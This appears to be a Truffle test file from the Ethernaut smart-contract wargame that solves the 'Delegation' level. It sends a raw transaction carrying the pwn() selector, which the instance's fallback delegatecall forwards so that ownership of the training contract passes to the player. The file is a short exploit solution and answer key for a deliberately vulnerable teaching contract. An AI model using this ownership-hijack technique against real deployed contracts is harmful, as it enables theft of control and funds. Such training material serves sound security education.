const DelegationFactory = artifacts.require('DelegationFactory')
const Delegation = artifacts.require('Delegation')

const utils = require('../utils/TestUtils')

contract('Delegation', function ([player]) {
  let ethernaut
  let level

  before(async function () {
    ethernaut = await utils.getEthernautWithStatsProxy()
    level = await DelegationFactory.new()
    await ethernaut.registerLevel(level.address)
  })

  it('should submit level instance successfully', async function () {
    const instance = await utils.createLevelInstance(ethernaut, level.address, player, Delegation)

    await web3.eth.sendTransaction({
      from: player,
      to: instance.address,
      // pwn() selector
      data: '0xdd365b8b',
    })

    const completed = await utils.submitLevelInstance(
      ethernaut,
      level.address,
      instance.address,
      player,
    )
    assert.isTrue(completed)
  })
})
